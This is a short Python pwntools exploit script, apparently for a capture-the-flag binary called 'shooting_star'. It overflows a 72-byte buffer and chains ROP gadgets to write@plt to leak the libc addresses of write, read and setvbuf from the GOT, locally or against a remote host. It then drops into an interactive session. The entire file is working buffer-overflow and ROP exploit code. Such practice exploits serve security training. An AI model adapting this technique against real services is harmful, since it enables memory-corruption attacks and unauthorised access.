#!/usr/bin/python

from pwn import *

context.binary = 'shooting_star'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


pop_rdi_ret         = 0x4012cb
pop_rsi_pop_r15_ret = 0x4012c9

write_plt = 0x401030
main_addr = 0x401230

offset = 72
junk = b'A' * offset


def leak(p, function_got: int) -> int:
    payload  = junk
    payload += p64(pop_rdi_ret)
    payload += p64(1)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(function_got)
    payload += p64(0)
    payload += p64(write_plt)
    payload += p64(main_addr)

    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'>> ', payload)
    p.recvline()
    p.recvline()

    return u64(p.recv(8))


def main():
    p = get_process()

    write_got   = 0x404018
    read_got    = 0x404020
    setvbuf_got = 0x404028

    write_addr   = leak(p, write_got)
    read_addr    = leak(p, read_got)
    setvbuf_addr = leak(p, setvbuf_got)

    log.info(f'Leaked write() address:   {hex(write_addr)}')
    log.info(f'Leaked read() address:    {hex(read_addr)}')
    log.info(f'Leaked setvbuf() address: {hex(setvbuf_addr)}')  

    p.interactive()


if __name__ == '__main__':
    main()


